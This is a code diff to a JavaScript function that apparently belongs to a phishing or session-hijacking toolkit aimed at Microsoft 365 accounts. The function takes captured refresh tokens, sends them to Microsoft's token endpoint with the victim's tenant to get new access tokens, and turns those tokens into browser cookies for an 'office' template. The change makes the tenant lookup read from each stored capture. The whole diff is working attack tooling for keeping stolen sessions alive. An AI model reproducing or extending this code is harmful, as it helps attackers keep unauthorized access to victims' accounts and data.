@@ -64,17 +64,21 @@ async function renewSingleCapture(capture, isPreemptive = false) {
       await sleep(attemptDelay);
     }
 
-    // Fetch tenant for this capture to use correct Azure AD endpoint
-    let tenant = 'common';
-    try {
-      const [links] = await db.query('SELECT jwt_payload FROM links WHERE id = ?', [capture.link_id]);
-      if (links.length && links[0].jwt_payload) {
-        try {
-          const parsed = JSON.parse(links[0].jwt_payload);
-          if (parsed.tenant) tenant = parsed.tenant;
-        } catch (e) { /* use default */ }
-      }
-    } catch (e) { /* use default */ }
+    // Use stored tenant from capture row (set at capture time), fallback to config or jwt_payload
+    let tenant = capture.tenant || 'common';
+    if (!tenant || tenant === 'common') {
+      try {
+        if (capture.link_id) {
+          const [links] = await db.query('SELECT jwt_payload FROM links WHERE id = ?', [capture.link_id]);
+          if (links.length && links[0].jwt_payload) {
+            try {
+              const parsed = JSON.parse(links[0].jwt_payload);
+              if (parsed.tenant) tenant = parsed.tenant;
+            } catch (e) { /* use default */ }
+          }
+        }
+      } catch (e) { /* use default */ }
+    }
 
     // Call Microsoft token endpoint with refresh token using the correct tenant
     const response = await axios.post(
@@ -99,10 +103,11 @@ async function renewSingleCapture(capture, isPreemptive = false) {
       return { success: false, error: 'Soft error - switched to device code flow', soft_error: true };
     }
 
-    // Convert to cookies with multiple domain support
+    // Convert to cookies with multiple domain support, using the capture's stored tenant
     const cookieResult = await convertTokensToCookies(
       newAccessToken,
-      capture.template_type || 'office'
+      capture.template_type || 'office',
+      capture.tenant || 'common'
     );
 
     if (cookieResult.success && cookieResult.cookies) {
